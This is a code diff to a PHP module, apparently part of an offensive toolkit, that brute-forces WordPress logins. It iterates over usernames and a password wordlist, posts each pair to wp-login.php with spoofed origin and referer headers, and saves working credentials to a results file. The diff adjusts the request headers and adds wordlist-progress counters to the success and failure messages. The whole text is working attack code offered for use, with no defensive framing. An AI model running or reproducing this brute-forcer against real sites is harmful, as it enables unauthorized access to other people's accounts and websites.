@@ -5,8 +5,9 @@ class Wordpress extends Modules
 		$ref    = str_replace("wp-login.php", "wp-admin/", $url);
 		$Origin = str_replace("wp-login.php", "", $url);
 		$header = array(
-			'Origin: '.$Origin,
-			'Content-Type:application/x-www-form-urlencoded'
+    		"content-type: application/x-www-form-urlencoded",
+    		"origin: ".$Origin,
+    		"referer: ".$ref
 		);
 		$result = $this->ngecurl($url , "log=".$username."&pwd=".$password , $header);
 		$this->Debug( $result );
@@ -64,13 +65,16 @@ class Wordpress extends Modules
 		}
 		$hit = count($user);
 		foreach ($user as $key => $users) {
-			foreach ($this->loadFile($passwordlist) as $key => $pass) {
+			$wordlist = $this->loadFile($passwordlist);
+			$countWL  = count($wordlist);
+			foreach ($wordlist as $key => $pass) {
 				if( $this->check($url."wp-login.php",$users,$pass) ){
-					$this->msg("[WPbrute][Login] Success -> ".$users." | ".$pass);
+					$this->msg("[WPbrute][".$hit."][".$countWL."][Login] Success -> ".$users." | ".$pass);
 					$this->ngesave("result/wpbrute","[+] ".$url." [".$users."|".$pass."]");
 				}else{
-					$this->msg("[WPbrute][".$hit."][Login] Failed -> ".$users." | ".$pass);
+					$this->msg("[WPbrute][".$hit."][".$countWL."][Login] Failed -> ".$users." | ".$pass);
 				}
+				$countWL = $countWL-1;
 			}
 			$hit = $hit-1;
 		}
@@ -95,12 +99,14 @@ class Wordpress extends Modules
 			}
 			$hit = count($user);
 			foreach ($user as $key => $users) {
-				foreach ($this->loadFile($passwordlist) as $key => $pass) {
+			$wordlist = $this->loadFile($passwordlist);
+			$countWL  = count($wordlist);
+				foreach ($wordlist as $key => $pass) {
 					if( $this->check($url."wp-login.php",$users,$pass) ){
-						$this->msg("[WPbrute][Login] Success -> ".$users." | ".$pass);
+						$this->msg("[WPbrute][".$hit."][".$countWL."][Login] Success -> ".$users." | ".$pass);
 						$this->ngesave("result/wpbrute","[+] ".$url." [".$users."|".$pass."]");		
 					}else{
-						$this->msg("[WPbrute][".$hit."][Login] Failed -> ".$users." | ".$pass);
+						$this->msg("[WPbrute][".$hit."][".$countWL."][Login] Failed -> ".$users." | ".$pass);
 					}
 				}
 				$hit = $hit-1;
